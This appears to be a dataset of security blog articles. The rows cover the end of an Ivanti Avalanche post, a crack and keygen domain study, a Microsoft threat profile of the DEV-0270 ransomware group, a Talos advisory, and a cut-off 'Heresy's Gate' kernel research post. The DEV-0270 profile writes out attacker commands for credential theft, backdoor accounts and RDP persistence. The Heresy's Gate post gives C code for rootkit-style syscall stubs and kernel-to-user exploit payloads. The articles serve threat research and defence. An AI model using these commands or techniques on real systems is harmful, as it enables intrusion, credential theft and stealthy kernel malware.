Code Execution with the uploaded webshell Conclusion I really hope that you were able to make it through this blog post, as I was not able to describe those issues with a smaller number of details (believe me, I have tried). As you can see, undiscovered attack surfaces can lead to both cool and dangerous vulnerabilities. It is something that you must look for, especially in products that are responsible for the administration of many other devices. This blog post is the last in this series of articles on Ivanti Avalanche research. However, I am planning something new, and yes, it concerns Java deserialization. Until then, you can follow me @chudypb and follow the team on Twitter or Instagram for the latest in exploit techniques and security patches."
7340649e-3ce4-5e0d-97fd-b3f25f7781b3,14-October-2022,Should Cracks and Keygens Remain a Cybersecurity Concern?,Research team collated 39 domains known for hosting malicious crack and keygen sites. cracking tools allow users to install software without paying for a license. using cracked software is illegal in the U.S.,"Cracks and keygens have long been a problem for software vendors in that they allow users to install their products without needing to pay for a legitimate license. As the Internet and website development advanced and became more accessible, the number of sites offering software cracking tools grew. Our research team recently searched the Web for websites that peddle cracks and keygens in an attempt to add more artifacts to publicly available lists of indicators of compromise (IoCs). We used 39 domains identified as IoCs as a starting point and found: A sample of the additional artifacts obtained from our analysis is available for download from our website . Our research team collated 39 domains known for hosting malicious crack and keygen sites. Accessing any of these is harmful to corporate network-connected users in that the activity could lead to malware infection. Worse than that, however, using cracked software is illegal and companies that allow employees to use them could be fined as much as US$150,000 if proven to have committed software piracy in the U.S. As part of our ongoing effort to make the Internet safer, we sought to identify other threat artifacts aided by WHOIS, DNS, and IP intelligence. We began by subjecting the IoCs to DNS lookups, which led to the discovery of 500 IP addresses to which they resolved. Based on the results, most of the crack and keygen sites pointed to the U.S., Netherlands, Germany, Canada, China, and France. We then looked at the IoCs’ historical WHOIS records and uncovered 15 unredacted email addresses used to register them. Most of them were Gmail accounts, which isn’t surprising since anyone can easily obtain one. Using the IP addresses and email addresses as reverse WHOIS search terms to find more artifacts provided us with 152 additional domains. A closer look at them pointed to seven that may be crack and keygen sites—crack[.]ws, crack[.]ms, netcrack[.]com, crackway[.]com, serials[.]ws, serialsource[.]net, and serialdevil[.]com. The sites’ screenshots showed that four were parked or up for sale, one led to a blank page, one was unreachable, and one—serials[.]ws—was indeed a crack and keygen site. We then wanted to know if crack and keygen site creation remains popular to this day. So, we searched for domains registered just this year and using strings commonly included in crack and keygen site names, namely “crack,” “keygen,” and “serial.” The searches gave us 6,563 domains containing “crack,” 141 domains containing “keygen,” and 1,771 domains containing “serial.” A bulk malware check via Threat Intelligence Platform (TIP) for the 6,500+ domains showed that 81 of them were malicious. Below are examples of the malicious crack and keygen sites. Exhaustive threat intelligence can help security teams uncover more malicious web properties than those that appear on publicly available lists of IoCs. Our IoC expansion study also showed that cracks and keygens remain an issue given the thousands of domains pointing to websites that sell them registered just this year. If you wish to perform a similar investigation or get access to the full data behind this research, please don’t hesitate to contact us ."
de18bc1a-be9f-53a2-8e93-250d95389bb4,07-September-2022,Profiling DEV-0270: PHOSPHORUS’ ransomware operations,Threat intelligence teams have tied attacks to a sub-group of Iranian actor PHOSPHORUS. Microsoft assesses with moderate confidence that DEV-0270 conducts malicious network operations on behalf of the government of Iran. This blog profiles the tactics and techniques behind the attacks. The group leverages exploits for high-severity vulnerabilities to gain access.,"Microsoft threat intelligence teams have been tracking multiple ransomware campaigns and have tied these attacks to DEV-0270, also known as Nemesis Kitten, a sub-group of Iranian actor PHOSPHORUS . Microsoft assesses with moderate confidence that DEV-0270 conducts malicious network operations, including widespread vulnerability scanning, on behalf of the government of Iran. However, judging from their geographic and sectoral targeting, which often lacked a strategic value for the regime, we assess with low confidence that some of DEV-0270’s ransomware attacks are a form of moonlighting for personal or company-specific revenue generation. This blog profiles the tactics and techniques behind the DEV-0270/PHOSPHORUS ransomware campaigns. We hope this analysis, which Microsoft is using to protect customers from related attacks, further exposes and disrupts the expansion of DEV-0270’s operations. DEV-0270 leverages exploits for high-severity vulnerabilities to gain access to devices and is known for the early adoption of newly disclosed vulnerabilities. DEV-0270 also extensively uses living-off-the-land binaries (LOLBINs) throughout the attack chain for discovery and credential access. This extends to its abuse of the built-in BitLocker tool to encrypt files on compromised devices. In some instances where encryption was successful, the time to ransom (TTR) between initial access and the ransom note was around two days. The group has been observed demanding USD 8,000 for decryption keys. In addition, the actor has been observed pursuing other avenues to generate income through their operations. In one attack, a victim organization refused to pay the ransom, so the actor opted to post the stolen data from the organization for sale packaged in an SQL database dump. Using these observations, this blog details the group’s tactics and techniques across its end-to-end attack chain to help defenders identify, investigate, and mitigate attacks. We also provide extensive hunting queries designed to surface stealthy attacks. This blog also includes protection and hardening guidance to help organizations increase resilience against these and similar attacks. Figure 1. Typical DEV-0270 attack chain Who is DEV-0270? Microsoft assesses that DEV-0270 is operated by a company that functions under two public aliases: Secnerd (secnerd[.]ir) and Lifeweb (lifeweb[.]ir). We have observed numerous infrastructure overlaps between DEV-0270 and Secnerd/Lifeweb. These organizations are also linked to Najee Technology Hooshmand (ناجی تکنولوژی هوشمند), located in Karaj, Iran. The group is typically opportunistic in its targeting: the actor scans the internet to find vulnerable servers and devices, making organizations with vulnerable and discoverable servers and devices susceptible to these attacks. As with any observed nation state actor activity, Microsoft directly notifies customers that have been targeted or compromised, providing them with the information they need to secure their accounts. Microsoft uses DEV-#### designations as a temporary name given to an unknown, emerging, or a developing cluster of threat activity, allowing Microsoft Threat Intelligence Center (MSTIC) to track it as a unique set of information until we reach a high confidence about the origin or identity of the actor behind the activity. Once it meets the criteria, a DEV is converted to a named actor. Observed actor activity Initial access In many of the observed DEV-0270 instances, the actor gained access by exploiting known vulnerabilities in Exchange or Fortinet (CVE-2018-13379). For Exchange, the most prevalent exploit has been ProxyLogon—this highlights the need to patch high-severity vulnerabilities in internet-facing devices, as the group has continued to successfully exploit these vulnerabilities even recently, well after updates supplied the fixes. While there have been indications that DEV-0270 attempted to exploit Log4j 2 vulnerabilities , Microsoft has not observed this activity used against customers to deploy ransomware. Discovery Upon gaining access to an organization, DEV-0270 performs a series of discovery commands to learn more about the environment. The command wmic computersystem get domain obtains the target’s domain name. The whoami command displays user information and net user command is used to add or modify user accounts. For more information on the accounts created and common password phrases DEV-0270 used, refer to the Advanced Hunting section. wmic computersystem get domain whoami net user On the compromised Exchange server, the actor used the following command to understand the target environment. Get-Recipient | Select Name -ExpandProperty EmailAddresses -first 1 | Select SmtpAddress | ft -hidetableheaders For discovery of domain controllers, the actor used the following PowerShell and WMI command. Credential access DEV-0270 often opts for a particular method using a LOLBin to conduct their credential theft, as this removes the need to drop common credential theft tools more likely to be detected and blocked by antivirus and endpoint detection and response (EDR) solutions. This process starts by enabling WDigest in the registry, which results in passwords stored in cleartext on the device and saves the actor time by not having to crack a password hash. ""reg"" add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f The actor then uses rundll32.exe and comsvcs.dll with its built-in MiniDump function to dump passwords from LSASS into a dump file. The command to accomplish this often specifies the output to save the passwords from LSASS. The file name is also reversed to evade detections ( ssasl.dmp) : Persistence To maintain access in a compromised network, the DEV-0270 actor adds or creates a new user account, frequently named DefaultAccount with a password of P@ssw0rd1234, to the device using the command net user /add. The DefaultAccoun t account is typically a pre-existing account set up but not enabled on most Windows systems. The attacker then modifies the registry to allow remote desktop (RDP) connections for the device, adds a rule in the firewall using netsh.exe to allow RDP connections, and adds the user to the remote desktop users group: ""reg"" add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v TSEnabled /t REG_DWORD /d 1 /f ""reg"" add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 ""reg"" add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v UserAuthentication /t REG_DWORD ""netsh"" advfirewall firewall add rule name=""Terminal Server"" dir=in action=allow protocol=TCP localport=3389 Scheduled tasks are one of the recurrent methods used by DEV-0270 in their attacks to maintain access to a device. Generally, the tasks load via an XML file and are configured to run on boot with the least privilege to launch a .bat via the command prompt. The batch file results in a download of a renamed dllhost.exe , a reverse proxy, for maintaining control of the device even if the organization removes the file from the device. Figure 2. Scheduled task used in DEV-0270 attacks Privilege escalation DEV-0270 can usually obtain initial access with administrator or system-level privileges by injecting their web shell into a privileged process on a vulnerable web server. When the group uses Impacket’s WMIExec to move to other systems on the network laterally, they are typically already using a privileged account to run remote commands. DEV-0270 also commonly dumps LSASS, as mentioned in the credential access section, to obtain local system credentials and masquerade as other local accounts which might have extended privileges. Another form of privilege escalation used by DEV-0270 involves the creation or activation of a user account to provide it with administrator privileges. DEV-0270 uses powershell.exe and net.exe commands to create or enable this account and add it to the administrators’ group for higher privileges. Defense evasion DEV-0270 uses a handful of defensive evasion techniques to avoid detection. The threat actors typically turn off Microsoft Defender Antivirus real-time protection to prevent Microsoft Defender Antivirus from blocking the execution of their custom binaries. The threat group creates or activates the DefaultAccount account to add it to the Administrators and Remote Desktop Users groups. The modification of the DefaultAccount provides the threat actor group with a legitimate pre-existing account with nonstandard, higher privileges. DEV-0270 also uses powershell.exe to load their custom root certificate to the local certificate database. This custom certificate is spoofed to appear as a legitimate Microsoft-signed certificate. However, Windows flags the spoofed certificate as invalid due to the unverified certificate signing chain. This certificate allows the group to encrypt their malicious communications to blend in with other legitimate traffic on the network. Additionally, DEV-0270 heavily uses native LOLBins to effectively avoid detection. The threat group commonly uses native WMI, net, CMD, and PowerShell commands and registry configurations to maintain stealth and operational security. They also install and masquerade their custom binaries as legitimate processes to hide their presence. Some of the legitimate processes they masquerade their tools as include: dllhost.exe , task_update.exe , user.exe , and CacheTask . Using .bat files and powershell.exe , DEV-0270 might terminate existing legitimate processes, run their binary with the same process name, and then configure scheduled tasks to ensure the persistence of their custom binaries. Lateral movement DEV-0270 has been seen creating defaultaccount and adding that account to the Remote Desktop Users group. The group uses the RDP connection to move laterally, copy tools to the target device, and perform encryption. Along with RDP, Impacket ’s WMIExec is a known toolkit used by the group for lateral movement. In multiple compromises, this was the main method observed for them to pivot to additional devices in the organization, execute commands to find additional high-value targets, and dump credentials for escalating privileges. An example of a command using Impacket’s WMIExec from a remote device: cmd.exe /Q /c quser 1> \\127.0.0.1\ADMIN$\__1657130354.2207212 2>&1 Impact DEV-0270 has been seen using setup.bat commands to enable BitLocker encryption, which leads to the hosts becoming inoperable. For workstations, the group uses DiskCryptor , an open-source full disk encryption system for Windows that allows for the encryption of a device’s entire hard drive. The group drops DiskCryptor from an RDP session and when it is launched, begins the encryption. This method does require a reboot to install and another reboot to lock out access to the workstation. The following are DEV-0270’s PowerShell commands using BitLocker: Microsoft will continue to monitor DEV-0270 and PHOSPHORUS activity and implement protections for our customers. The current detections, advanced detections, and IOCs in place across our security products are detailed below. Recommended mitigation steps The techniques used by DEV-0270 can be mitigated through the following actions: Apply the corresponding security updates for Exchange Server , including applicable fixes for CVE-2021-26855 , CVE-2021-26858 , CVE-2021-26857 and CVE-2021-27065 . While it is important to prioritize patching of internet-facing Exchange servers to mitigate risk in an ordered manner, unpatched internal Exchange Server instances should also be addressed as soon as possible. For Exchange Server instances in Mainstream Support, critical product updates are released for the most recently released Cumulative Updates (CU) and for the previous CU. For Exchange Server instances in Extended Support, critical product updates are released for the most recently released CU only. If you don’t have a supported CU, Microsoft is producing an additional series of security updates (SUs) that can be applied to some older and unsupported CUs to help customers more quickly protect their environment. For information on these updates, see March 2021 Exchange Server Security Updates for older Cumulative Updates of Exchange Server. Installing the updates is the only complete mitigation for these vulnerabilities and has no impact on functionality. If the threat actor has exploited these vulnerabilities to install malware, installing the updates does not remove implanted malware or evict the actor. Use Microsoft Defender Firewall , intrusion prevention devices, and your network firewall to prevent RPC and SMB communication among devices whenever possible. This limits lateral movement and other attack activities. Check your perimeter firewall and proxy to restrict or prevent network appliances like Fortinet SSL VPN devices from making arbitrary connections to the internet to browse or download files. Enforce strong local administrator passwords. Use tools like LAPS . Ensure that Microsoft Defender Antivirus is up to date and that real-time behavior monitoring is enabled. Keep backups so you can recover data affected by destructive attacks. Use controlled folder access to prevent unauthorized applications from modifying protected files. Turn on the following attack surface reduction rules to block or audit activity associated with this threat: Block credential stealing from the Windows local security authority subsystem (lsass.exe) Block process creations originating from PsExec and WMI commands Block persistence through WMI event subscription. Ensure that Microsoft Defender for Endpoint is up to date and that real-time behavior monitoring is enabled Detection details Microsoft Defender for Endpoint Alerts with the following titles in the security center can indicate threat activity on your network: Malware associated with DEV-0270 activity group detected The following additional alerts may also indicate activity associated with this threat. These alerts, however, can be triggered by unrelated threat activity and are not monitored in the status cards provided with this report. A script with suspicious content was observed Suspicious file dropped by Exchange Server process A suspicious file was observed Suspicious Modify Registry Anomalous behavior by a common executable Suspicious Permission Groups Discovery Lazagne post-exploitation tool Suspicious PowerShell command line Local Emails Collected Suspicious PowerShell download or encoded command execution Mimikatz credential theft tool Suspicious Process Discovery ‘Mimilove’ high-severity malware was prevented Suspicious process executed PowerShell command New group added suspiciously Suspicious process launched using dllhost.exe Ongoing hands-on-keyboard attack via Impacket toolkit Suspicious ‘PShellCobStager’ behavior was blocked Possible Antimalware Scan Interface (AMSI) tampering Suspicious Scheduled Task Process Launched Possible attempt to discover groups and permissions Suspicious sequence of exploration activities Possible exploitation of Exchange Server vulnerabilities Suspicious ‘SuspExchgSession’ behavior was blocked Possible exploitation of ProxyShell vulnerabilities Suspicious System Network Configuration Discovery Possible web shell installation Suspicious System Owner/User Discovery Process memory dump Suspicious Task Scheduler activity Suspicious Account Discovery: Email Account Suspicious User Account Discovery Suspicious behavior by cmd.exe was observed Suspicious user password change Suspicious behavior by svchost.exe was observed Suspicious w3wp.exe activity in Exchange System file masquerade Suspicious behavior by Web server process Tampering with the Microsoft Defender for Endpoint sensor Suspicious Create Account Unusual sequence of failed logons Suspicious file dropped WDigest configuration change Hunting queries Microsoft Sentinel Microsoft Sentinel customers can use the following queries to look for the related malicious activity in their environments. DEV-0270 registry IOC This query identifies modification of registry by DEV-0270 actor to disable security feature as well as to add ransom notes: https://github.com/Azure/Azure-Sentinel/blob/master/Detections/MultipleDataSources/Dev-0270RegistryIOCSep2022.yaml DEV-0270 malicious PowerShell usage DEV-0270 heavily uses PowerShell to achieve their objective at various stages of their attack. This query locates PowerShell activity tied to the actor: https://github.com/Azure/Azure-Sentinel/blob/master/Detections/MultipleDataSources/Dev-0270PowershellSep2022.yaml DEV-0270 WMIC discovery This query identifies dllhost.exe using WMIC to discover additional hosts and associated domains in the environment: https://github.com/Azure/Azure-Sentinel/blob/master/Detections/MultipleDataSources/Dev-0270WMICDiscoverySep2022.yaml DEV-0270 new user creation This query tries to detect creation of a new user using a known DEV-0270 username/password schema: https://github.com/Azure/Azure-Sentinel/blob/master/Detections/MultipleDataSources/Dev-0270NewUserSep2022.yaml Microsoft 365 Defender To locate possible actor activity, run the following queries. Disable services via registry Search for processes modifying the registry to disable security features. GitHub link DeviceProcessEvents | where InitiatingProcessCommandLine has_all(@’”reg”’, ‘add’, @’”HKLM\SOFTWARE\Policies\’, ‘/v’,’/t’, ‘REG_DWORD’, ‘/d’, ‘/f’) and InitiatingProcessCommandLine has_any(‘DisableRealtimeMonitoring’, ‘UseTPMKey’, ‘UseTPMKeyPIN’, ‘UseAdvancedStartup’, ‘EnableBDEWithNoTPM’, ‘RecoveryKeyMessageSource’) Modifying the registry to add a ransom message notification Identify registry modifications that are indicative of a ransom note tied to DEV-0270. GitHub link DeviceProcessEvents | where InitiatingProcessCommandLine has_all(‘”reg”’, ‘add’, @’”HKLM\SOFTWARE\Policies\’, ‘/v’,’/t’, ‘REG_DWORD’, ‘/d’, ‘/f’, ‘RecoveryKeyMessage’, ‘Your drives are Encrypted!’, ‘@’) DLLHost.exe file creation via PowerShell Identify masqueraded DLLHost.exe file created by PowerShell. GitHub link DeviceProcessEvents | where InitiatingProcessFileName =~ ‘powershell.exe’ | where InitiatingProcessCommandLine has_all(‘$file=’, ‘dllhost.exe’, ‘Invoke-WebRequest’, ‘-OutFile’) Add malicious user to Admins and RDP users group via PowerShell Look for adding a user to Administrators in remote desktop users via PowerShell. GitHub link DeviceProcessEvents | where InitiatingProcessFileName =~ 'powershell.exe' | where InitiatingProcessCommandLine has_all('$admins=', 'System.Security.Principal.SecurityIdentifier', 'Translate', '-split', 'localgroup', '/add', '$rdp=') Email data exfiltration via PowerShell Identify email exfiltration conducted by PowerShell. GitHub link DeviceProcessEvents | where FileName =~ 'powershell.exe' | where ProcessCommandLine has_all('Add-PSSnapin', 'Get-Recipient', '-ExpandProperty', 'EmailAddresses', 'SmtpAddress', '-hidetableheaders') Create new user with known DEV-0270 username/password Search for the creation of a new user using a known DEV-0270 username/password schema. GitHub link DeviceProcessEvents | where InitiatingProcessCommandLine has_all('net user', '/add') | parse InitiatingProcessCommandLine with * ""user "" username "" ""* | extend password = extract(@""\buser\s+[^\s]+\s+([^\s]+)"", 1, InitiatingProcessCommandLine) | where username in('DefaultAccount') or password in('P@ssw0rd1234', '_AS_@1394') PowerShell adding exclusion path for Microsoft Defender of ProgramData Identify PowerShell creating an exclusion path of ProgramData directory for Microsoft Defender to not monitor. GitHub link DeviceProcessEvents | where FileName =~ ""powershell.exe"" and ProcessCommandLine has_all(""try"", ""Add-MpPreference"", ""-ExclusionPath"", ""ProgramData"", ""catch"") DLLHost.exe WMIC domain discovery Identify dllhost.exe using WMIC to discover additional hosts and associated domain. GitHub link DeviceProcessEvents | where InitiatingProcessFileName =~ ""dllhost.exe"" and InitiatingProcessCommandLine == ""dllhost.exe"" | where ProcessCommandLine has ""wmic computersystem get domain"""
8aceee17-3631-53d5-9dfb-a0a26d62745e,07-October-2022,Vulnerability Spotlight: Issue in Hancom Office 2020 could lead to code execution,Cisco Talos has discovered a memory corruption vulnerability in Hancom Office 2020. the vulnerability exists in the way the software processes XML files. an attacker could exploit this vulnerability by tricking the user into opening a specially crafted file.,"Marcin “Icewall” Noga of Cisco Talos discovered this vulnerability. Blog by Jon Munshaw. Cisco Talos recently discovered an exploitable memory corruption vulnerability in Hancom Office 2020. Hancom Office is a popular software collection among South Korean users that offers similar products to Microsoft Office, such as word processing and spreadsheet creation and management. TALOS-2022-1574 (CVE-2022-33896) exists in the way the Hword word processing software processes XML files. An attacker could exploit this vulnerability by tricking the user into opening a specially crafted file, triggering a memory corruption error on the software and potentially leading to remote code execution on the targeted machine. Cisco Talos worked with Hancom to ensure that this issue is resolved and an update is available for affected customers, all in adherence to Cisco’s vulnerability disclosure policy . Users are encouraged to update these affected products as soon as possible: Hancom Office 2020, version 11.0.0.5357. Talos tested and confirmed this version of Hancom Office could be exploited by this vulnerability. The following Snort rules will detect exploitation attempts against this vulnerability: 60254 and 60255. Additional rules may be released in the future and current rules are subject to change, pending additional vulnerability information. For the most current rule information, please refer to your Firepower Management Center or Snort.org."
a0b7efaa-149e-5408-a8ae-f9c5d6807535,14-June-2020,"""Heresy's Gate"": Kernel Zw*/NTDLL Scraping +",Heresy's Gate is a way to scrape kernel-mode syscalls in Windows Vista. The method uses the undocumented Worker Factory feature of the user-mode Thread Pool API. The author describes a new method to exploit Ring 0 and Ring 3 transitions.,"Introduction Heresy's Gate Closing Nebbett's Gate Meltdown KVA Shadow Page Fault Loop NTDLL Opcode Scraping KnownDlls Section Object Extracting Syscall Opcode Dynamically Cloning a Zw Call Fixing nt!KiService* Relative 32 Addresses Create a Heretic Call Stub Work Out Well Known Ring 0 Escapes Queuing a User Mode APC SharedUserData SystemCall Hook (+ Others) Worker Factory Internals NTDLL Thread Pool Implementation Creating a Worker Factory Adjusting Worker Factory Minimum Threads Step Into the Ring 3 Conclusion Introduction What's in a name? Naming things is the first step in being able to talk about them. What's a lower realm than Hell? Heresy is the 6th Circle of Hell in Dante's Inferno. With Hell's Gate scraping syscalls in user-mode, you can think about Heresy's Gate as the generic methodology to dynamically generate and execute kernel-mode syscall stubs that are not exported by ntoskrnl.exe. Much like Hell's Gate, the general idea has been discussed previously (in this case since at least NT 4), however older techniques (Nebbett's Gate) no longer work and this post may introduce new methods. A proud people who believe in political throwback, that's not all I'm here to present you. Unlocking Heresy's Gate, among other things, gives access to a plethora of novel Ring 0 (kernel) to Ring 3 (user) transitions, as is required by exploit payloads in EternalBlue ( DoublePulsar ), BlueKeep , and SMBGhost . Just to name a few. I will describe such a method, Work Out , using the undocumented Worker Factory feature that is the kernel backbone of the user-mode Thread Pool API added in Windows Vista. tl;dr: PoC || GTFO All of this information was casually shared with a member of MSRC and forwarded to the Windows Defender team prior to publication. These are not vulnerabilities; Heresy's Gate is rootkit tradecraft to execute private syscalls, and Work Out is a new kernel mode exploit payload. I have no knowledge of if/how/when mitigations/ETW/etc. may be added to NT. Heresy's Gate Many fun routines are not readily exported by the Executive binary (ntoskrnl.exe). They simply do not exist in import/export directories for any module. And with their ntoskrnl.exe file/RVA offsets changing between each compile, they can be difficult to find in a generic way. Not exactly ASLR, but similar. However, if a syscall exists, NTDLL.DLL/USER32.DLL/WIN32U.DLL are gonna have stubs for them. Heaven's Gate : Execute 64-bit syscalls in WoW64 (32-bit code) Hell's Gate : Execute syscalls in user-mode direcly by scraping ntdll op codes Heresy's Gate: Execute unexported syscalls in kernel-mode (described here by scraping ntdll and &ZwReadFile) I'll lump Heaven's gate into this, even though it is only semi-related. Alex Ionescu has written about how CFG killed the original technique . I guess if you went further up the chain than WoW64, or perhaps something fancy in managed code land or a Universal Windows Platform app, you'd have a Higher Gate ? And since Heresy is only the sixth circle, there's still room to go lower... HAL's Gate? Closing Nebbett's Gate People have been heuristically scanning function signatures and even disassembling in the kernel for ages to find unexported routines. I wondered what the earliest reference would be for executing an unexported routine. Gary Nebbett describes in pages 433-434 of ""Windows NT/2000 Native API Reference"" about finding unexported syscalls in ntdll and executing their user-mode stubs directly in kernel mode! Interesting indeed. I thought: there's no way this code could still work! Open questions: There must be issues with how the syscall stub has changed over the years? Can modern ""syscall"" instruction (not int 0x2e) even execute in kernel mode? There's probably issues with modern kernels implementing SMEP (though you could just Capcom it and piss off PatchGuard in your payload). Will this screw up PreviousMode and we need user buffers and such? Aren't these ntdll functions often hooked by user-mode antivirus code? What about the logic of Meltdown KVA Shadow? Meltdown KVA Shadow Page Fault Loop And indeed, it seems that the Meltdown KVA Shadow strikes again to spoil our exploit payload fun. I attempted this method on Windows 10 x64 and to my surprise I did not immediately crash! However, my call to sc.exe appeared to hang forever. Let's peek at what the thread is doing: Oof, it appears to be in some type of a page fault loop. Indeed setting a breakpoint on KiPageFaultShadow will cause it to hit over and over. Maybe this and all the other potential issues could be worked around? Instead of fighting with Meltdown patch and all the other outstanding issues, I decided to scrape opcodes out of NTDLL and copy an exported Zw function stub out of the Executive. NTDLL Opcode Scraping To scrape an opcode number out of NTDLL, we must find its Base Address in kernel mode. There are at least 3 ways to accomplish this. You can map it out of a processes PEB->Ldr using PsGetProcessPeb() while under KeStackAttachProcess(). You can call ZwQuerySystemInformation() with the SystemModuleInformation class. You can look it up in the KnownDlls section object. KnownDlls Section Object I thought the last one is the most interesting and perhaps less known for antivirus detection methods, so we'll go with that. However, I think if I was writing a shellcode I'd go with the first one. NTSTATUS NTAPI GetNtdllBaseAddressFromKnownDlls( _In_ ZW_QUERY_SECTION __ZwQuerySection, _Out_ PVOID *OutAddress ) { static UNICODE_STRING KnownDllsNtdllName = RTL_CONSTANT_STRING(L""\\KnownDlls\\ntdll.dll""); NTSTATUS Status = STATUS_SUCCESS; OBJECT_ATTRIBUTES ObjectAttributes = { 0 }; InitializeObjectAttributes( &ObjectAttributes, &KnownDllsNtdllName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 0, NULL ); HANDLE SectionHandle = NULL; Status = ZwOpenSection(&SectionHandle, SECTION_QUERY, &ObjectAttributes); if (NT_SUCCESS(Status)) { // +0x1000 because kernel only checks min size UCHAR SectionInfo[0x1000]; Status = __ZwQuerySection( SectionHandle, SectionImageInformation, &SectionInfo, sizeof(SectionInfo), 0 ); if (NT_SUCCESS(Status)) { *OutAddress = ((SECTION_IMAGE_INFORMATION*)&SectionInfo) ->TransferAddress; } ZwClose(SectionHandle); } return Status; } This requires the following struct definition: typedef struct _SECTION_IMAGE_INFORMATION { PVOID TransferAddress; // ... } SECTION_IMAGE_INFORMATION, *PSECTION_IMAGE_INFORMATION; Once you have the NTDLL base address, it is a well-known process to read the PE export directory to find functions by name/ordinal. Extracting Syscall Opcode Let's inspect an NTDLL syscall. Note: Syscalls have changed a lot over the years. However, the MOV EAX, #OPCODE part is probably pretty stable. And since syscalls are used as a table index; they are never a larger value than 0xFFFF. So the higher order bits will be 0x0000. You can scan for the opcode using the following mask: CHAR WildCardByte = '\xff'; // b8 ?? ?? 00 00 mov eax, 0x0000???? UCHAR NtdllScanMask[] = ""\xb8\xff\xff\x00\x00""; Dynamically Cloning a Zw Call So we have the opcode from the user-mob stub, now we need to create the kernel-mode stub to call it. We can accomplish this by cloning an existing stub. ZwReadFile() is pretty generic, so let's go with that. The MOV EAX instruction right before the final JMP is the syscall opcode. We'll have to overwrite it with our desired opcode. Fixing nt!KiService* Relative 32 Addresses So, the LEA and JMP instruction use relative 32-bit addressing. That means it is a hardcoded offset within +/-2GB of the end of the instruction. Converting the relative 32 address to its 64-bit full address is pretty simple code: static inline PVOID NTAPI ConvertRelative32AddressToAbsoluteAddress( _In_reads_(4) PUINT32 Relative32StartAddress ) { UINT32 Offset = *Relative32StartAddress; PUCHAR InstructionEndAddress = (PUCHAR)Relative32StartAddress + 4; return InstructionEndAddress + Offset; } Since our little stub will not be within +/- 2GB space, we'll have to replace the LEA with a MOVABS, and the JMP (rel32) with a JMP [$+0]. I checked that this mask is stable to at least Windows 7, and probably way earlier. UCHAR KiServiceLinkageScanMask[] = ""\x50"" // 50 push rax ""\x9c"" // 9c pushfq ""\x6a\x10"" // 6a 10 push 10h ""\x48\x8d\x05\x00\x00\x00\x00""; // 48 8d 05 ?? ?? ?? ?? // lea rax, [nt!KiServiceLinkage] UCHAR KiServiceInternalScanMask[] = ""\x50"" // 50 push rax ""\xb8\x00\x00\x00\x00"" // b8 ?? ?? ?? ?? mov eax, ?? ""\xe9\x00\x00\x00\x00""; // e9 ?? ?? ?? ?? jmp nt!KiServiceInternal Create a Heretic Call Stub So now that we've scanned all the offsets we can perform a copy. Allocate the stub, keeping in mind our new stub will be larger because of the MOVABS and JMP [$+0] we are adding. You'll have to do a couple of memcpy's using the mask scan offsets where we are going to replace the LEA and JMP rel-32 instructions. This clone step is only mildly annoying, but easy to mess up. Next perform the following fixups: Overwrite the syscall opcode Change the LEA relative-32 to a MOVABS instruction Change the JMP relative-32 to a JMP [$+0] Place the nt!KiServiceInternal pointer at $+0 Now just cast it to a function pointer and call it! Work Out The Windows 10 Executive does now export some interesting functions like RtlCreateUserThread , no Heresy needed!, so an ultramodern payload likely has it easy. This was not the case when I checked the Windows 7 Executive (did not check 8). Heresy's Gate techniques gets you access to ZwCreateThread(Ex) . You could also build out a ThreadContinue primitive using ZwSetContextThread . Also, PsSetContextThread is readily exported. Well Known Ring 0 Escapes I will describe a new method about how to escape with Worker Factories, however first let's gloss over existing methodologies being used. Queuing a User Mode APC Right now, all the hot exploits, malwares, and antiviruses seem to always be queuing user-mode Asynchronous Procedure Calls (APCs). As far as I can tell, it's because _sleepya copypasta'd me (IMPORTANT: no disrespect whatsoever, everyone in this copypasta chain made MASSIVE improvements to eachother) and I copypasta'd the Equation Group who copypasta'd Barnaby Jack, and people just use the available method because it's off-the-shelf code. I originally got the idea from Luke Jenning's writeup on DoublePulsar 's process injection, and through further analysis optimized a few things including the overall shellcode size to 14.41% the original size . APCs are a very complicated topic and I don't want to get too in the weeds. At a high level, they are how I/O callbacks can return data back to usermode, asynchronously without blocking. You can think of it like the heart of the Windows epoll/kqueue methods. Essentially, they help form a proactor (vs. reactor) pattern that fixed NT creator David Cutler's issues with Unix . He expressed his low opinion of the Unix process input/output model by reciting ""Get a byte, get a byte, get a byte byte byte"" to the tune of the finale of Rossini's William Tell Overture.[citation needed] It's worth noting Linux (and basically all modern operating systems) now have proactor pattern I/O facilities. At any rate, the psuedo-code workflow is as follows: target_thread = ... KeInitializeApc( &apc, target_thread, mode = both, kernel_func = &kapc, user_func = NOT_NULL ); KeInsertQueueApc(&apc); --- ring 0 apc --- kapc: mov cr8, PASSIVE_LEVEL *NormalRoutine = ZwAllocateVirtualMemory(RWX) _memcpy(*NormalRoutine, user_start) mov cr8, APC_LEVEL --- ring 3 apc --- user_start: CreateThread(&calc_shellcode) calc_shellcode: Find an Alertable + Waiting State thread. Create an APC on the thread. Queue the APC. In kernel routine, drop IRQL and allocate payload for the user-mode NormalRoutine. In user mode, spawn a new thread from the one we hijacked. There's even more plumbing going on under the hood and it's actually a pretty complicated process. Do note that at least all required functions are readily exported. You can also do it without a kernel-mode APC, so you don't have to manually adjust the IRQL (however the methodology introduces its own complexities). Also note that the target thread not only needs to be Alertable, it needs to be in a Waiting State, which is fairly hard to check in a cross-version way. You can DKOM traverse EPROCESS.ThreadListHead backwards as non-Alertable threads are always the first ones. If the thread is not in a Waiting State, the call to KeInsertQueueApc will return an NT error. The injected process will also crash if TEB.ActivationContextStackPointer is NULL. A more verbose version of the technique I believe was first described in 2005 by Barnaby Jack in the paper Remote Windows Kernel Exploitation: Step Into the Ring 0 . The technique may have been known before 2005, however this is not documented functionality so would be rare for a normal driver writer to have stumbled on it. Matt Suiche attempted to document the history of the APC technique and has a similar finding as Barnaby Jack being the original discoverer. Driver code that implements the APC technique to inject a DLL into a process from the kernel is provided by Petr Beneš. There's also a writeup with some C code in the Vault7 leak. The method is also available in x64 assembly in places such as the Metasploit BlueKeep exploit; sleepya_ and I have (noncollaboratively) built upon eachother's work over the past few years to improve the payload. Indeed this shellcode is the basis for the SMBGhost exploits released by both ZecOps and chompy1337 . This abuse of APC queuing has been such a thorn 